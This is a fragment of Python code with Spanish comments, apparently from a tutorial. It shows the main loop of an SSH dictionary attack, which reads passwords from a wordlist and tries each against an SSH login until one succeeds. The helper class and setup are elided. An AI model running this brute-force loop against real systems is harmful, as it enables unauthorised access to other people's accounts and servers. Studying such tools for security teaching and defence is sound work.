...
if __name__ == "__main__":   
    ...
    objeto_ssh=ssh()
    #solicitamos al usuario los datos que vamos a necesitar
    ...
    #Mientras exista una contraseña y la correcta no haya sido encontrada
    while (contraseña_ssh and not encontrada):
        #Sumamos uno al contador de contraseñas
        contador_contraseñas += 1
        #Imprimimos el número de intento por el que vamos y la contraseña con la que se prueba
        print('[-] Intento ' + str(contador_contraseñas) + ': ' + str(contraseña_ssh) + ' ...', end='')
        #Asignamos la contraseña al atributo correspondiente del objeto ssh
        objeto_ssh.password=contraseña_ssh
        #Intentamos realizar la conexión ssh, y asignamos la salida del método correspondiente a la variable "encontrada". En el momento en el que esta variable tome el valor True, significará que
        #la contraseña ha sido encontrada, y la ejecución dejará de entrar en el bucle
        encontrada = objeto_ssh.conectar_ssh()
        #Leemos la siguiente línea del fichero y se la asignamos a la variable "contraseña_ssh"
        contraseña_ssh=fichero_diccionario.readline().strip('\n')
